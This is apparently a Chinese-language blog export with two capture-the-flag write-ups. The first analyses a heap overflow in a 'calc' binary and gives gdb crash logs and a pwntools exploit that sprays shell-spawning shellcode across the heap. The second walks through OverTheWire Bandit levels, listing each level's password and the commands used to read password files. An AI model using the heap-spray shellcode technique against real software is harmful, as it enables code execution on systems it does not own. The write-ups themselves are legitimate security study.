\n\n这个while循环内会对输入进行处理，是跟外部数据交互的窗口，因此漏洞极有可能存在于循环内部的处理过程。\n\n### line 9\n\n这一行通过fgets从标准输入（即键盘）中获取输入字符串。根据fgets的特性，本题中它最多接受`256-1=255`个字符输入。s在栈上的空间为0x100=256，加上字符串结束符'\\x00'也不会溢出。\n\n> **char \\*fgets(char \\*str, int n, FILE \\*stream)** 从指定的流 stream 读取一行，并把它存储在 **str** 所指向的字符串内。当读取 **(n-1)** 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止。\n\n### line 10\n\n这一行及后两行的目的是对输入字符串进行处理。寻找输入字符串最后一次出现'\\n'的位置，即字符串结束的位置，并往该位置写0x00（是ASCII码的0，而不是字符 '0'。）\n\n### line11\n\n第11行是函数sub_8048BC1(&s)，处理输入的字符串s。使用strtok将字符串s进行分解。\n\n> char *strtok(char *str, const char *delim) 分解字符串 str 为一组字符串，delim 为分隔符。\n\n这个函数中，有三个大的处理逻辑：\n\n- while ( s1 )：对传入字符串分解得到的运算数和运算符进行解析，并将运算数链接到bss段的dword_804D0B4，将运算符链接到bss段的dword_804D0AC。\n- while ( !sub_804A8D7(dword_804D0AC) )：判断dword_804D0AC指向堆空间的第一个值是否为0（第一个值代表运算符个数），即判断是否存在运算符。\n- if ( !result )\n\n#### while(s1)\n\n如下对运算数的处理中存在漏洞函数。重点看a和b两段指令。\n\n```c\n    if ( (*__ctype_b_loc())[*s1] & 0x800 || *s1 == '-' && strlen(s1) > 1 )\n    {\n      if ( sub_804886B(s1) )\n      {\n        v1 = sub_804A6F8(byte_804AC65, s1);\t\t//a\n        sub_804A8B5(dword_804D0B4, v1);\t\t\t//b\n      }\n      else\n      {\n        puts(\"invalid number\");\n      }\n      goto LABEL_68;\n    }\n```\n\n- a - sub_804A6F8函数\n\n  ```c\n  _DWORD *__cdecl sub_804A6F8(char *s, char *nptr)\n  {\n    _DWORD *v2; // ST1C_4\n  \n    v2 = calloc(0x10u, 1u);\n    v2[2] = strtol(nptr, 0, 10);\n    v2[1] = \"int\";\n    *v2 = strdup(s);\n    v2[3] = strlen(nptr);\n    return v2;\n  }\n  ```\n\n  可以看到，该函数中生成了如下堆块，并返回给上层调用者。\n\n  ```\n  heap1中存放着函数的第一个参数；string1处的字符串为“int”；num是运算数的十进制表达式；最后一个块中存放运算数的长度信息。\n  |------------|\n  | &heap1     |\n  |------------|\n  | &string1   |\n  |------------|\n  | num        |\n  |------------|\n  | strlen(num)|\n  |------------|\n  ```\n\n  \n\n- b - sub_804A8B5函数\n\n  ```c\n  _DWORD *__cdecl sub_804A8B5(_DWORD *a1, int a2)\n  {\t\t\n    _DWORD *result; // eax\n  \n    ++*a1;\n    result = a1;\n    a1[*a1 + 1] = a2;\n    return result;\n  }\n  ```\n\n  该函数的入参为：a1是dword_804D0B4（即指向0x84大小的堆块），a2是sub_804A6F8函数返回的堆块地址。函数的功能是操作0x84堆块中的内容，将堆中第一块（4字节）的内容自加1（作为计数，记录堆块中链接了多少个操作数），并从第3个块（a1[2]）处链接操作数堆块a2。\n\n对运算符的处理过程跟以上对运算数的处理过程基本一致，只不过运算符是链接在dword_804D0AC指向的堆块上。\n\n由于dword_804D0B4指向的堆块先于dword_804D0AC指向堆块的申请，因此他俩在堆空间的排布如下：\n\n![](image-20200627001525800.png)\n\ndword_804D0B4指向的堆块大小为0x84，最多可存储0x84/0x4 - 2=0x21 - 2=33 - 2 = 31个运算数信息。但是我们可以输入256个字节的字符串，因此我们可输入的运算数远远大于31，那么此时运算数信息就会溢出到存放运算符的堆块。如上图所示，第33个运算数的堆块会覆盖绿色堆块中的count，那么之后访问运算符的时候会取到一个超大的值。\n\n#### while ( !sub_804A8D7(dword_804D0AC) )\n\n```c\n    v9 = sub_804A88E(dword_804D0AC);\n    (*(v9 + 8))();\n```\n\n先调用sub_804A88E函数，从运算符堆块中取出一个运算符，然后对该运算符取值运行。\n\n```c\nint __cdecl sub_804A88E(_DWORD *a1)\n{\n  return a1[(*a1)-- + 1];\n}\n```\n\n我们可以看到sub_804A88E中访问了运算符堆块的第一个count，即*a1。上面讨论了这个值可以被越界覆盖，因此在这里会越界访问，导致程序崩溃。\n\n## 1.4 poc\n\n```shell\n$ python -c \"print '1 ' * 33\"\n1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n$ gdb calc\ngef➤  r\nStarting program: /mnt/hgfs/VMshare/calc/calc \n> 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 \n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804a89c in ?? ()\n[ Legend: Modified register | Code | Heap | Stack | String ]\n─────────────────────────────────────────────────────────────────── registers ────\n$eax   : 0x0804e0a8  →  0x0804f058  →  0x0804f070  →  0x00000000\n$ebx   : 0x0       \n$ecx   : 0x0       \n$edx   : 0x0804f058  →  0x0804f070  →  0x00000000\n$esp   : 0xffffcd08  →  0x00000000\n$ebp   : 0xffffcd18  →  0xffffcd78  →  0xffffcea8  →  0x00000000\n$esi   : 0xf7fb6000  →  0x001b1db0\n$edi   : 0xf7fb6000  →  0x001b1db0\n$eip   : 0x0804a89c  →   mov eax, DWORD PTR [eax+edx*4+0x4]\n$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\n$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 \n────────────────────────────────────────────────────────────────────────── stack ────\n0xffffcd08│+0x0000: 0x00000000\t ← $esp\n0xffffcd0c│+0x0004: 0x00000000\n0xffffcd10│+0x0008: 0x00000000\n0xffffcd14│+0x000c: 0x00000000\n0xffffcd18│+0x0010: 0xffffcd78  →  0xffffcea8  →  0x00000000\t ← $ebp\n0xffffcd1c│+0x0014: 0x080493b6  →   add esp, 0x10\n0xffffcd20│+0x0018: 0x0804e0a8  →  0x0804f058  →  0x0804f070  →  0x00000000\n0xffffcd24│+0x001c: 0x0804ac54  →   and BYTE PTR [eax], al\n───────────────────────────────────────────────────────────────────────── code:x86:32 ────\n    0x804a892                  in     al, dx\n    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl\n    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]\n →  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]\n    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax\n    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]\n    0x804a8a6                  mov    eax, DWORD PTR [eax]\n    0x804a8a8                  lea    edx, [eax-0x1]\n    0x804a8ab                  mov    eax, DWORD PTR [ebp+0x8]\n────────────────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, Name: \"calc\", stopped, reason: SIGSEGV\n──────────────────────────────────────────────────────────────────────── trace ────\n[#0] 0x804a89c → mov eax, DWORD PTR [eax+edx*4+0x4]\n[#1] 0x80493b6 → add esp, 0x10\n[#2] 0x8048bb9 → add esp, 0x10\n[#3] 0xf7e1c637 → __libc_start_main(main=0x80488cb, argc=0x1, argv=0xffffcf54, init=0x804aba0, fini=0x804ac00, rtld_fini=0xf7fe8880 <_dl_fini>, stack_end=0xffffcf4c)\n[#4] 0x8048791 → hlt \n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc\n0x0804e000 0x0806f000 0x00000000 rwx [heap]\n0xf7e03000 0xf7e04000 0x00000000 rwx \n0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb4000 0xf7fb6000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb6000 0xf7fb7000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7fb7000 0xf7fba000 0x00000000 rwx \n0xf7fd3000 0xf7fd4000 0x00000000 rwx \n0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]\ngef➤  \n```\n\n可以看到，程序运行到`0x804a89c   mov    eax, DWORD PTR [eax+edx*4+0x4]`处时，崩溃了。`eax+edx*4+0x4 = 0x0804e0a8 +0x0804f058*4 + 0x4 = 0x2818a20c`。通过上面的vmmap信息，可以看出，0x2818a20c这个地址并未被映射，所以访问时会导致程序异常崩溃。\n\n我们要怎样利用这个异常访问呢？如果我们能将这个超大地址映射成功，并且能控制这个地址的内容，是不是就能控制执行流了呢？\n\n这个题没有开NX，因此堆栈上的数据可以执行，我们可以在堆上布局shellcode。\n\n# 2 利用\n\n## 2.1 申请不释放的堆空间\n\n我们发现乘法函数sub_8049A0E中有一段申请内存的操作，但是并没有释放这些内存。因此我们可以利用该乘法函数，不断扩展堆空间，使0x2818a20c这个位置被映射。\n\n如下代码段是sub_8049A0E函数中涉及内存申请的部分。当一个字符类型和一个整形相乘时，会根据字符长度和整型值的乘积申请堆空间。`*(v8 + 12)` 是字符的长度，`*(v7 + 8)`是整型值。\n\n```c\n       else if ( !strcmp(*(v8 + 4), \"str\") && !strcmp(*(v7 + 4), \"int\") )\n        {\n          v6 = *(v7 + 8);\n          dest = calloc(*(v8 + 12) * *(v7 + 8) + 1, 1u);\n          v9 = dest;\n```\n\n因此用如下poc测试申请堆空间，确认能否将较高地址处映射成功。\n\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch = \"i386\",os = \"linux\")\nmyelf = ELF(\"./calc\")\nmyproc = process(myelf.path)\n\npayload = '\"a \" * 100000'\nfor i in range(6000):\n    myproc.sendlineafter(\">\",payload)\ngdb.attach(myproc,\"b * 0x0804A89C\\nc\")\n\nmyproc.recvuntil(\">\")\npayload = \"1 \" * 33\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```\n\n执行结果如下，可见0x09779000至0x510e2000的地址空间全被映射为堆空间了，并且被我们的输入\"a \"给填满了。\n\n```shell\n───────────────────────────────────────────────────────────────── registers ────\n$eax   : 0x097790a8  →  0x510c22d8  →  0x510c22f0  →  0x00000000\n$ebx   : 0x0       \n$ecx   : 0x0       \n$edx   : 0x510c22d8  →  0x510c22f0  →  0x00000000\n\n─────────────────────────────────────────────────────────────── code:x86:32 ────\n    0x804a892                  in     al, dx\n    0x804a893                  adc    BYTE PTR [ebx+0x108b0845], cl\n    0x804a899                  mov    eax, DWORD PTR [ebp+0x8]\n →  0x804a89c                  mov    eax, DWORD PTR [eax+edx*4+0x4]\n    0x804a8a0                  mov    DWORD PTR [ebp-0x4], eax\n    0x804a8a3                  mov    eax, DWORD PTR [ebp+0x8]\n    0x804a8a6                  mov    eax, DWORD PTR [eax]\n\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x0804c000 0x00000000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804c000 0x0804d000 0x00003000 r-x /mnt/hgfs/VMshare/calc/calc\n0x0804d000 0x0804e000 0x00004000 rwx /mnt/hgfs/VMshare/calc/calc\n0x09779000 0x510e2000 0x00000000 rwx [heap]\n0xf7dad000 0xf7dae000 0x00000000 rwx \n0xf7dae000 0xf7f5e000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7f5e000 0xf7f60000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7f60000 0xf7f61000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7f61000 0xf7f64000 0x00000000 rwx \n0xf7f7d000 0xf7f7e000 0x00000000 rwx \n0xf7f7e000 0xf7f81000 0x00000000 r-- [vvar]\n0xf7f81000 0xf7f83000 0x00000000 r-x [vdso]\n0xf7f83000 0xf7fa6000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7fa6000 0xf7fa7000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7fa7000 0xf7fa8000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffd0000 0xffff1000 0x00000000 rwx [stack]\n\ngef➤  x/10gx 0x33333333\n0x33333333:\t0x6161616161616161\t0x6161616161616161\n0x33333343:\t0x6161616161616161\t0x6161616161616161\n0x33333353:\t0x6161616161616161\t0x6161616161616161\n0x33333363:\t0x6161616161616161\t0x6161616161616161\n0x33333373:\t0x6161616161616161\t0x6161616161616161\n```\n\n此时eax+edx*4+0x4的计算如下：\n\n```shell\n>>> eax = 0x097790a8\n>>> edx = 0x510c22d8\n>>> hex(eax+edx*4+0x4)\n'0x14da81c0c'\n```\n\n由于环境是32位的，所以最终计算结果为'0x4da81c0c'，这个值是sub_804A88E函数的返回值。这个返回值作为地址，偏移8字节的位置处的值，会被作为函数执行。如果我们能劫持0x4da81c0c+8=0x4da81c14地址处的值，就可以劫持控制流。\n\n```c\n    v9 = sub_804A88E((_DWORD *)G_D0AC);\n    (*(void (**)(void))(v9 + 8))();\n```\n\n## 2.2 exp\n\n通过以上的分析可知，我们需要往堆空间布局一些shellcode，并且劫持`(*(void (**)(void))(v9 + 8))()`执行我们的shellcode。但是我们很难精确将shellcode布置到该地址，因此采用'\\x0c'滑板指令，结合shellcode的方式完成利用。\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch = \"i386\",os = \"linux\")\nmyelf = ELF(\"./calc\")\nmyproc = process(myelf.path)\n\n#payload = '\"a\" * 100000'\npayload = '\"' + asm(shellcraft.sh()).ljust(200,'\\x0c') + '\" * 500'\nfor i in range(6000):\n    myproc.sendlineafter(\">\",payload)\ngdb.attach(myproc,\"b * 0x0804A89C\\nc\")\n\nmyproc.recvuntil(\">\")\npayload = \"1 \" * 33\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```","categories":["CTF"]},{"title":"overthewire bandit","url":"/2020/05/17/overthewire-bandit/","content":"\n# 1 题目链接\n\n[https://overthewire.org/wargames/bandit/](https://overthewire.org/wargames/bandit/)\n\n# 2 解题过程\n\n(0)\n\nbandit.labs.overthewire.org, on port 2220\n\n(1)\n\nssh bandit1@bandit.labs.overthewire.org -p 2220\n\nboJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\n(2)\n\nssh bandit2@bandit.labs.overthewire.org -p 2220\n\nCV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n`cat \"spaces in this filename\"`\n`cat spaces\\ in\\ this\\ filename`\n\n(3)\n\nssh bandit3@bandit.labs.overthewire.org -p 2220\n\nUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n(4)\n\nssh bandit4@bandit.labs.overthewire.org -p 2220\n\npIwrPrtPN36QITSp3EQaw936yaFoFgAB\n\n```\nbandit4@bandit:~/inhere$ file ./-file*\n./-file00: data\n./-file01: data\n./-file02: data\n./-file03: data\n./-file04: data\n./-file05: data\n./-file06: data\n./-file07: ASCII text\n./-file08: data\n./-file09: data\nbandit4@bandit:~/inhere$ cat ./-file07\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n```\n(5)\n\nssh bandit5@bandit.labs.overthewire.org -p 2220\n\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n```\nfind ./ -type f -size 1033c\n```\n\n(6)\n\nssh bandit6@bandit.labs.overthewire.org -p 2220\n\nDXjZPULLxYr17uwoI01bNLQbtFemEgo7\n\n```\nfind ./ -size 33c -user bandit7 -group bandit6\ncat ./var/lib/dpkg/info/bandit7.password\n```\n\n\n\n(7)\n\nssh bandit7@bandit.labs.overthewire.org -p 2220\n\nHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n\n```\ngrep -ri millionth\n```\n\n\n\n(8)\n\nssh bandit8@bandit.labs.overthewire.org -p 2220\n\ncvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n```\nsort ./data.txt | uniq -u\n```\n\n\n\n(9)\n\nssh bandit9@bandit.labs.overthewire.org -p 2220\n\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n\n```\nstrings ./data.txt | grep ====\n```\n\n\n\n(10)\n\nssh bandit10@bandit.labs.overthewire.org -p 2220\n\ntruKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n```\nbandit10@bandit:~$ base64 -d data.txt \nThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n```\n\n(11)\n\nssh bandit11@bandit.labs.overthewire.org -p 2220\n\nIFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n\n```\nbandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\nThe password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n```\n\n(12)\n\nssh bandit12@bandit.labs.overthewire.org -p 2220\n\n5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\n```shell\n    7  mkdir /tmp/bling\n    8  cp data.txt /tmp/bling\n    9  cd /tmp/bling\n   13  xxd -r data.txt data.bin\n   18  file data.bin\n   19  mv data.bin data.gz\n   20  gzip -d data.gz\n   22  file data\n   23  bzip2 -d data\n   25  file data.out\n   26  mv data.out data.gz\n   28  gzip -d data.gz\n   30  file data\n   31  tar -xvf data\n   33  file data5.bin\n   35  tar -xvf data5.bin\n   36  file data6.bin\n   37  bzip2 -d data6.bin\n   39  file data6.bin.out\n   40  tar -xvf data6.bin.out\n   45  file data8.bin\n   46  mv data8.bin data8.gz\n   48  gzip -d data8.gz\n   50  file data8\n   51  cat data8\n```\n\n(13)\n\nssh bandit13@bandit.labs.overthewire.org -p 2220\n\n8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n\n```\nssh bandit14@localhost -i sshkey.private\ncat  /etc/bandit_pass/bandit14\n```\n\n(14)\n\nssh bandit14@bandit.labs.overthewire.org -p 2220\n\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n\n```shell\nbandit14@bandit:~$ nc localhost 30000\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\nCorrect!\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n```\n\n(15)\n\nssh bandit15@bandit.labs.overthewire.org -p 2220\n\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n\n```shell\nbandit15@bandit:~$ openssl s_client -connect localhost:30001\nCONNECTED(00000003)\ndepth=0 CN = localhost\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = localhost\nverify return:1\n---\nCertificate chain\n 0 s:/CN=localhost\n   i:/CN=localhost\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\nMIICBjCCAW+gAwIBAgIEDU18oTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls\nb2NhbGhvc3QwHhcNMjAwNTA3MTgxNTQzWhcNMjEwNTA3MTgxNTQzWjAUMRIwEAYD\nVQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK3CPNFR\nFEypcqUa8NslmIMWl9xq53Cwhs/fvYHAvauyfE3uDVyyX79Z34Tkot6YflAoufnS\n+puh2Kgq7aDaF+xhE+FPcz1JE0C2bflGfEtx4l3qy79SRpLiZ7eio8NPasvduG5e\npkuHefwI4c7GS6Y7OTz/6IpxqXBzv3c+x93TAgMBAAGjZTBjMBQGA1UdEQQNMAuC\nCWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0\nZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3\nDQEBBQUAA4GBAC9uy1rF2U/OSBXbQJYuPuzT5mYwcjEEV0XwyiX1MFZbKUlyFZUw\nrq+P1HfFp+BSODtk6tHM9bTz+p2OJRXuELG0ly8+Nf/hO/mYS1i5Ekzv4PL9hO8q\nPfmDXTHs23Tc7ctLqPRj4/4qxw6RF4SM+uxkAuHgT/NDW1LphxkJlKGn\n-----END CERTIFICATE-----\nsubject=/CN=localhost\nissuer=/CN=localhost\n---\nNo client certificate CA names sent\nPeer signing digest: SHA512\nServer Temp Key: X25519, 253 bits\n---\nSSL handshake has read 1019 bytes and written 269 bytes\nVerification error: self signed certificate\n---\nNew, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384\nServer public key is 1024 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nNo ALPN negotiated\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384\n    Session-ID: 007E0D8A0128B2FF4D905508CF737C9AA328D4D7EC300F3670BF87BF48F448AB\n    Session-ID-ctx: \n    Master-Key: 0943896BA02534F6AD45C9F4FD218941160F569022FD88ADD3C91E5555A65B4E56FBAC7628F26A5703404039B9AF6C4D\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - aa 02 e6 3a 2e 0b c8 5d-6f 54 4a 1b 5a e0 2c 0e   ...:...]oTJ.Z.,.\n    0010 - 2b 8e 00 de ab bf a4 f4-12 a3 29 78 f8 c9 c1 86   +.........)x....\n    0020 - ff 7e ea db 76 0f 6c b8-45 ee 4c bd 2e 81 3f ff   .~..v.l.E.L...?.\n    0030 - 81 ff c9 0d 2b 14 fe c9-28 84 1d 41 80 47 9f 9b   ....+...(..A.G..\n    0040 - b6 72 e4 9e d1 80 c6 9c-d6 05 8c 58 31 b2 14 f3   .r.........X1...\n    0050 - b5 ca 94 a9 02 01 7e b7-6d a1 7d 6d fb 07 9f b5   ......~.m.}m....\n    0060 - 41 25 06 59 eb 61 d3 62-16 d3 69 35 5a b1 49 07   A%.Y.a.b..i5Z.I.\n    0070 - 53 3f 04 5f f2 b7 e7 45-34 56 82 f5 6e 2e fe 0d   S?._...E4V..n...\n    0080 - a9 cd a6 d5 ff 90 89 b1-a6 4c 82 8b 8b b8 a8 15   .........L......\n    0090 - 95 6e d9 9f 0b bb 4a 9e-e2 01 60 c0 9c 44 a3 6a   .n....J...`..D.j\n\n    Start Time: 1589699552\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: yes\n---\nBfMYroe26WYalil77FoDi9qh59eK5xNr\nCorrect!\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\nclosed\n```\n\n\n\n(16)\n\nssh bandit16@bandit.labs.overthewire.org -p 2220\n\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\n```shell\nbandit16@bandit:~$ nmap -p 31000-32000 localhost\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2020-05-17 09:18 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00028s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n31046/tcp open  unknown\n31518/tcp open  unknown\n31691/tcp open  unknown\n31790/tcp open  unknown\n31960/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n-------------------------------------------------------------------------------\nbandit16@bandit:~$ nmap -sV -p 31000-32000 localhost\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2020-05-17 09:34 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00025s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE     VERSION\n31046/tcp open  echo\n31518/tcp open  ssl/echo\n31691/tcp open  echo\n31790/tcp open  ssl/unknown\n31960/tcp open  echo\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31790-TCP:V=7.40%T=SSL%I=7%D=5/17%Time=5EC0E90B%P=x86_64-pc-linux-g\nSF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu\nSF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\nSF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea\nSF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest,\nSF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\\nSF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x\nSF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20\nSF:correct\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20Please\nSF:\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"W\nSF:rong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r\nSF:(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20c\nSF:urrent\\x20password\\n\")%r(LPDString,31,\"Wrong!\\x20Please\\x20enter\\x20the\nSF:\\x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20Pl\nSF:ease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptions\nSF:,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\nSF:\\n\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.00 seconds\n------------------------------------------------------------------------\nbandit16@bandit:~$ mkdir /tmp/bling2/\nbandit16@bandit:~$ echo \"cluFn7wTiGryunymYOu4RcffSxQluehd\" | openssl s_client -connect localhost:31790 -quiet 2>/dev/null | tail -n 28 > /tmp/bling2/ssh.private\n-----------------------------------------------------------------------\nssh -i ssh.private bandit17@localhost\ncat /etc/bandit_pass/bandit17\n```\n\n\n\n(17)\n\nssh bandit17@bandit.labs.overthewire.org -p 2220\n\nxLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n\n```\nbandit17@bandit:~$ diff passwords.old passwords.new\n42c42\n< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii\n---\n> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n```\n\n(18)\n\nssh bandit18@bandit.labs.overthewire.org -p 2220\n\nkfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n\n```\nbling@bling:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat readme\"\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit18@bandit.labs.overthewire.org's password: \nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n```\n\n(19)\n\nssh bandit19@bandit.labs.overthewire.org -p 2220\n\nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n\n```\nbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n```\n\n(20)\n\nssh bandit20@bandit.labs.overthewire.org -p 2220\n\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n\n```\n一个终端：\nbandit20@bandit:~$ nc -l -p 2333 < /etc/bandit_pass/bandit20\n\n另一个终端：\nbandit20@bandit:~$ ./suconnect 2333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n\n第一个终端接收到如下字符串：\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n```\n\n或者用一条命令完成\n\n```\nsh -c \"nc -l -p 2333 & < /etc/bandit_pass/bandit20\"; ./suconnect 2333\nor \nsh -c \"echo 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 2333 &\";./suconnect 8888\n```\n\n(21)\n\nssh bandit21@bandit.labs.overthewire.org -p 2220\n\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n\n```shell\nbandit21@bandit:~$ cd /etc/cron.d/\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22\n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh\n#!/bin/bash\nchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\ncat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n```\n\n(22)\n\nssh bandit22@bandit.labs.overthewire.org -p 2220\n\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n\n```shell\nbandit22@bandit:~$ cd /etc/cron.d\nbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23\n@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\n* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\nbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh\n#!/bin/bash\n\nmyname=$(whoami)\nmytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n\necho \"Copying passwordfile 